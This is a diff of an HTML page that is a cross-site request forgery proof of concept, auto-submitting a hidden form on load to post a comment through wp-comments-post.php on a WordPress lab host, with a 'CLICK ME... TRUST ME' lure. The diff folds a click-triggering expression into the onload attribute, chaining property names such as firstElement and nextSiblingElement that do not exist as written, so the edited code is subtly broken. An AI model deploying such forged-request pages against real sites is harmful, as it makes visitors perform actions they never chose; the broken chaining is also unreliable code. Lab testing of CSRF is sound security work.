@@ -1,6 +1,8 @@
 <html>
   <head></head>
-  <body onload="document.csrfForm.submit()">
+  <body
+    onload="document.csrfForm.submit().firstElement.nextSiblingElement.nextSiblingElement.click"
+  >
     <form
       name="csrfForm"
       action="http://wpdistillery.vm/wp-comments-post.php"
@@ -15,8 +17,5 @@
         value="CLICK ME! SOMETHING GOOD WILL HAPPEN, TRUST ME."
       />
     </form>
-    <script>
-      document.firstElement.nextSiblingElement.nextSiblingElement.click;
-    </script>
   </body>
 </html>
